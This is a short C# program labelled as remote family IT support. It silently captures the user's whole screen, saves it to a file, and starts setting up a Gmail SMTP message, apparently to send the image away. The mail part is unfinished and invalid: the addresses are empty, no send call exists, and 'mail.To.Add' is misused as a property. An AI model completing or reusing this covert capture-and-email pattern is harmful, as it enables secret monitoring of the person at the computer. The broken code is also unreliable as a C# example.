using System;
using System.Drawing;
using System.Windows.Forms;
using System.Net.Mail;

namespace RemoteFamilyITSupport
{
    class Program
    {
        static void Main(string[] args)
        {
            Bitmap memoryImage;
            memoryImage = new Bitmap(Convert.ToInt32(Screen.PrimaryScreen.Bounds.Width), Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height));
            Size s = new Size(memoryImage.Width, memoryImage.Height);

            Graphics memoryGraphics = Graphics.FromImage(memoryImage);

            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);

            string str = "";
            try
            {
                str = string.Format("Screenshot.png");
            }
            catch (Exception er)
            {
                Console.WriteLine("Error occured: " + er.Message);
                Console.ReadKey();
            }

            memoryImage.Save(str);

            SendMail();
        }

        private static void SendMail()
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("");
            mail.To.Add = ("");
        }
    }

}